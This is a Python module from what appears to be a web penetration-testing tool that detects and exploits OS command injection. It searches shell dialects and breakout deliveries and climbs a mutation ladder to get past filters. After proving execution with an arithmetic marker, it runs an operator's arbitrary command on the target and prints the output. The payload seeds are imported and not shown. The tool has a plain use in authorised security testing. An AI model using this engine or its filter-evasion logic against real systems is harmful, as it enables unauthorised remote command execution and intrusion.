"""The command injection graph: ask a question, then use the answer.

The question is an arithmetic one - print two markers with a computed number
between them - because a page that echoes the payload back returns the
expression, and only a shell that ran it returns the number.

Two axes are searched, and neither is a payload list:

  * the **dialect**. `sh`, `bash` and `cmd` print and compute differently and
    accept different rewrites. Which one it is is not something that can be read
    off the request, so it is searched - and the search is why a rewrite that
    only works in bash is kept and gated rather than dropped.
  * the **delivery**. A parameter that is the command needs nothing; one that is
    appended to a command the application chose has to end that command first,
    and there is more than one way to end it.

The mutation ladder runs inside each delivery, so a filter has to be defeated on
the shape that works before the next shape is tried.
"""

from __future__ import annotations

import secrets

from ...core.mutate import Kind
from ...engine.arithmetic import Arithmetic
from ...engine.bypass import Confidence
from ...engine.inject import candidates, inject, inject_escalating, note_finding
from ...engine.statemachine import Action, RunContext, State, StateGraph, Transition
from .mutators import register as register_mutators
from .seeds import CMD, DELIVERIES, POSIX, POWERSHELL, SHELLS, Shell, question

register_mutators()

PROVEN = "cmdi.proven"
FINDINGS = "cmdi.findings"
SHELL = "cmdi.shell"
DELIVERY = "cmdi.delivery"
PARAM = "cmdi.param"

# Which dialect to try, and which rewrites to hold back while trying it.
#
# The dialect is not readable off the request, so it is searched, and the seed
# text is the same for the first two passes - what differs is which rewrites are
# available. The first pass is the common case and holds back what POSIX cannot
# run; if nothing answered, the second opens the bash-only rewrites back up. So a
# proof in the second pass is evidence of bash specifically: it is the one thing
# the first pass could not have produced.
PASSES: tuple[tuple[Shell, str, frozenset[str]], ...] = (
    (POSIX, "posix", frozenset(POSIX.cannot)),
    (POSIX, "bash", frozenset()),
    (POWERSHELL, "powershell", frozenset(POWERSHELL.cannot)),
    (CMD, "cmd", frozenset(CMD.cannot)),
)


# How much slower than the fastest answer a response has to be before it is read
# as the target doing something other than running the command.
#
# A value that reaches a command as an argument and does not end it makes that
# command wait: measured on the lab, the endpoint runs `ping`, so a payload that
# does not break out costs fifteen seconds against a tenth of a second baseline,
# because ping is resolving it as a host name. Rewriting the text of such a
# payload changes nothing about that, and forty of them cost ten minutes for the
# same answer.
#
# The absolute floor keeps this from firing on a target whose answers are simply
# quick: three times thirty milliseconds is not a hang.
SLOW_FACTOR = 5.0
SLOW_FLOOR = 1.0


class Reference:
    """The fastest answer this run has had, for telling slow from normal.

    Seeded by asking for the page untouched, because otherwise the first payload
    sets the reference and the slowest thing the run does becomes its idea of
    normal.
    """

    def __init__(self) -> None:
        self.fastest: float | None = None

    def observe(self, elapsed: float) -> None:
        if self.fastest is None or elapsed < self.fastest:
            self.fastest = elapsed

    def looks_stuck(self, elapsed: float) -> bool:
        if self.fastest is None:
            return False
        return elapsed > SLOW_FLOOR and elapsed > SLOW_FACTOR * self.fastest


def measure_reference(ctx: RunContext, param) -> Reference:
    """Ask for the page once, untouched, to learn what a normal answer costs."""
    reference = Reference()
    _, exchange = inject(ctx, param, param.value, "probe.timing")
    if not exchange.response.error:
        reference.observe(exchange.response.elapsed)
    return reference


def probe_exec(ctx: RunContext) -> None:
    """Ask each candidate dialect and delivery whether it runs anything.

    In two passes, and the order is the point. Every dialect-and-delivery pair
    gets its cheapest question first, before any of them is allowed to climb its
    rewrites. Without that, the first dialect explored spends the whole request
    budget deepening one guess and the last one is never asked at all - measured
    on a real cmd.exe host, where the command interpreter is the fourth entry and
    the run reported nothing while the answer was two requests away.
    """
    params = candidates(ctx)
    if not params:
        return

    # What was learned about a rewrite is worth carrying to the next target of
    # the same kind, and not to a different kind: beating one filter's rules says
    # something about that filter, and a target with none at all is a kind of its
    # own. A command payload carries no scheme, so the family has to be named
    # here rather than derived from the value.
    host = ctx.config["request"].host()
    scope = f"command:{ctx.bypass.filter_class(host)}"
    pairs = [
        (shell, dialect, excluded, delivery)
        for shell, dialect, excluded in PASSES
        for delivery in DELIVERIES
    ]

    for param in params:
        if ctx.stopped:
            return
        reference = measure_reference(ctx, param)

        # Pass one: the seed itself, once per pair, so nothing is left unasked.
        for shell, dialect, excluded, delivery in pairs:
            if ctx.stopped:
                return
            found = _ask(
                ctx, param, shell, dialect, excluded, delivery, reference, scope, climb=False
            )
            if found is not None:
                _record(ctx, param, dialect, delivery, *found)
                return

        # Pass two: the same pairs again, this time allowed to rewrite.
        for shell, dialect, excluded, delivery in pairs:
            if ctx.stopped:
                return
            found = _ask(
                ctx, param, shell, dialect, excluded, delivery, reference, scope, climb=True
            )
            if found is not None:
                _record(ctx, param, dialect, delivery, *found)
                return


def _ask(
    ctx: RunContext,
    param,
    shell: Shell,
    dialect: str,
    excluded: frozenset[str],
    delivery,
    reference: Reference,
    scope: str,
    climb: bool,
):
    """Put one seed to the target. The tuple to report when it answers, else None."""
    arithmetic = Arithmetic()
    seed = question(shell, arithmetic, delivery)
    outcome = inject_escalating(
        ctx,
        param,
        seed,
        "probe.exec",
        kind=Kind.COMMAND,
        # A first pass spends one request per pair; the second is where rewrites
        # are allowed. `max_generation=0` is what makes the first pass cheap.
        max_generation=3 if climb else 0,
        exclude_families=excluded,
        # Being let through is not the answer here. The value has to have reached
        # a shell and the shell has to have printed the sum, so the climb
        # continues past a request nobody refused.
        until=lambda exchange, check=arithmetic: (
            check.proved(exchange.response.text) is not None
        ),
        # And a seed the target sat on is not worth forty rewrites.
        abandon=lambda exchange, ref=reference: ref.looks_stuck(exchange.response.elapsed),
        scope=scope,
    )
    if outcome is None:
        return None
    request, exchange, variant = outcome
    reference.observe(exchange.response.elapsed)
    answer = arithmetic.proved(exchange.response.text)
    if answer is None:
        return None
    return variant, request, exchange, answer


def _record(ctx, param, dialect: str, delivery, variant, request, exchange, answer: str) -> None:
    """A command ran. Say which dialect, which delivery, and with what."""
    note = {
        "name": f"command execution ({dialect})",
        "param": param.key(),
        "payload": variant.value,
        "generation": variant.generation,
        "evidence": f"the shell printed the sum {answer} between the two markers",
        "family": "command",
        "note": f"delivery: {delivery.name} - {delivery.why}",
    }
    ctx.blackboard.set(
        PROVEN,
        True,
        evidence=note["evidence"],
        confidence=Confidence.CONFIRMED,
    )
    ctx.blackboard.set(
        SHELL, dialect, evidence=f"{delivery.name}: {delivery.why}", confidence=Confidence.CONFIRMED
    )
    ctx.blackboard.set(
        DELIVERY,
        delivery.name,
        evidence=delivery.why,
        confidence=Confidence.CONFIRMED,
    )
    # Which parameter this was, so the command step aims at the one that was
    # proved rather than at whichever one the run listed first.
    ctx.blackboard.set(
        PARAM,
        param.key(),
        evidence="the parameter the proof came back through",
        confidence=Confidence.CONFIRMED,
    )
    note_finding(ctx, FINDINGS, note)


def probe_filter_action(ctx: RunContext) -> None:
    """Find out whether anything is filtering before spending payloads on it.

    Two of the four answers a run can give look identical without this. A
    parameter that does not reach a shell and one that reaches a shell behind a
    filter both end with no proof, and only one of them is worth trying harder
    on - so the filter is looked for first, and what it looks like is recorded
    for the rewrites to be ordered by.
    """
    from ...engine.filterprobe import probe_filter, probe_without_agent

    for param in candidates(ctx):
        if ctx.stopped:
            return
        outcome = probe_filter(ctx, param, "filter.probe")
        if outcome.refused:
            ctx.emit(f"  [!] {outcome.describe()}")
        # And once with no User-Agent, because a filter that behaves differently
        # when the client identifies itself is telling us what it is.
        probe_without_agent(ctx, param, "filter.probe")


def verdict(ctx: RunContext) -> str:
    """Why nothing was proved, in the terms the four answers are kept separate in.

    "Nothing ran" is two different findings and a run has to say which one it
    has. Behind a filter it means the spellings were refused and the parameter
    may still reach a shell; with no filter at all it means nothing reached one.
    Reporting both the same way is how a target that merely needs a different
    rewrite gets written off as not injectable.
    """
    refusals = ctx.bypass.refusals()
    if refusals:
        return (
            f"nothing got past the filter: {refusals} requests were refused, so whether the "
            "parameter reaches a shell is still open - it was not reached, not ruled out"
        )
    return (
        "no dialect and delivery produced the arithmetic result, and nothing was refused: the "
        "parameter does not appear to reach a shell"
    )


def classify(ctx: RunContext) -> None:
    """Record the verdict on the board, on the path where the run gets this far."""
    if ctx.blackboard.get(PROVEN):
        return
    ctx.blackboard.mark_not_covered("probe.exec", verdict(ctx))


def run_command(ctx: RunContext) -> None:
    """Run the operator's command through the shape that was proved to work."""
    command = ctx.config.get("os_cmd") or ""
    if not command:
        ctx.blackboard.mark_not_covered(
            "exploit.command",
            "no command was given; pass --os-cmd to run one through the injection that was found",
        )
        return

    shell_name = ctx.blackboard.get(SHELL) or "posix"
    shell = next((entry for entry in SHELLS if entry.name == shell_name), POSIX)
    delivery_name = ctx.blackboard.get(DELIVERY) or "direct"
    delivery = next((entry for entry in DELIVERIES if entry.name == delivery_name), DELIVERIES[0])

    # The parameter that proved it, not the first one the run happened to pick.
    # Aiming the command at a different parameter is aiming it somewhere nothing
    # has been shown to run.
    param = _proved_param(ctx)
    if param is None:
        ctx.blackboard.mark_not_covered(
            "exploit.command", "the run cannot tell which parameter was proved, so nothing was run"
        )
        return

    # Say something first whose return is not a matter of opinion, in the same
    # request as the command itself. A command's output is whatever the page
    # happens to contain when it fails, and printing that as the command's output
    # is the exact shape of reporting success without evidence.
    #
    # In one request rather than two, because a separate check does not fix the
    # thing that actually went wrong: the climb sends a pollution request before
    # the payload, and on a framework that reads the first of a repeated
    # parameter that request carries no payload at all. A check of its own can be
    # satisfied by a request that carried nothing, and then the command run
    # returns the same empty request and prints the original page as the output -
    # measured, on a real cmd.exe host, where it printed the application's own
    # echo of the value it was given before the injection existed. Requiring the
    # marker in the response that is about to be shown keeps the two together.
    marker = "ik" + secrets.token_hex(6)
    payload = (
        f"{delivery.prefix}{shell.literal(marker)}{shell.join}{command}{delivery.suffix}"
    )
    outcome = inject_escalating(
        ctx,
        param,
        payload,
        "exploit.command",
        kind=Kind.COMMAND,
        exclude_families=frozenset(shell.cannot),
        until=lambda exchange, want=marker: want in exchange.response.text,
    )
    if outcome is None or marker not in outcome[1].response.text:
        ctx.emit(f"[!] the marker did not come back over {param.key()}; nothing was run")
        ctx.blackboard.set(
            "cmdi.command",
            command,
            evidence=f"the self-check marker did not return over {param.key()}, so the command "
            "was never shown to run and nothing here is its output",
            confidence=Confidence.INCONCLUSIVE,
        )
        ctx.blackboard.mark_dead_end(
            "exploit.command",
            "the injection stopped working between proving it and using it",
        )
        return

    _, exchange, _variant = outcome
    ctx.emit("")
    ctx.emit(f"[+] running on the target: {command}")
    ctx.emit(exchange.response.text.rstrip())
    ctx.blackboard.set(
        "cmdi.command",
        command,
        evidence=f"the self-check marker returned in the same request over {param.key()}",
        confidence=Confidence.CONFIRMED,
    )


def _proved_param(ctx: RunContext):
    """The parameter the finding named, looked up among this run's parameters."""
    wanted = ctx.blackboard.get(PARAM) or ""
    for param in candidates(ctx):
        if param.key() == wanted:
            return param
    return None


def report_summary(ctx: RunContext) -> None:
    """What the run proved, and what it did not get to ask.

    The verdict is given here as well as during the run, and deliberately: a run
    that spends its whole budget inside the probe never reaches the action that
    records it, and then a target that needed one more rewrite looks exactly like
    a run that found nothing to say.
    """
    if ctx.blackboard.get(PROVEN):
        shell = ctx.blackboard.get(SHELL) or "unknown"
        delivery = ctx.blackboard.get(DELIVERY) or "unknown"
        ctx.emit(f"[+] result: the parameter runs commands, through {shell} ({delivery})")
    else:
        ctx.emit(f"[-] result: no command execution was established - {verdict(ctx)}")

    if not ctx.config.get("os_cmd"):
        ctx.blackboard.mark_not_covered(
            "exploit.command", "no --os-cmd was given, so nothing was run through the injection"
        )


# ----------------------------------------------------------------- graph shape


def build_graph(name: str = "cmdi") -> StateGraph:
    """Assemble the command injection graph."""
    graph = StateGraph(name=name, start="probe")
    graph.add(
        State(
            name="probe",
            description="ask whether anything here reaches a shell",
            actions=[
                Action(
                    "filter.probe", "find out whether anything is filtering", probe_filter_action
                ),
                Action("probe.exec", "make the target compute something and print it", probe_exec),
                Action("classify", "say what the parameter turned out to be", classify),
            ],
            transitions=[
                Transition(
                    "exploit",
                    # Gated on a command being asked for, so a run that only wants
                    # to know whether the parameter is injectable never sends one.
                    lambda ctx: bool(ctx.config.get("os_cmd"))
                    and bool(ctx.blackboard.get(PROVEN)),
                    "a command was asked for and the parameter runs them",
                ),
                Transition("finish", lambda ctx: True, "nothing further to ask"),
            ],
        )
    )
    graph.add(
        State(
            name="exploit",
            description="run the operator's command through what was proved",
            actions=[Action("exploit.command", "run one command and show its output", run_command)],
            transitions=[Transition("finish", lambda ctx: True, "done")],
        )
    )
    graph.add(
        State(
            name="finish",
            description="summarise what the run proved",
            actions=[Action("report.summary", "print the result", report_summary)],
        )
    )
    return graph
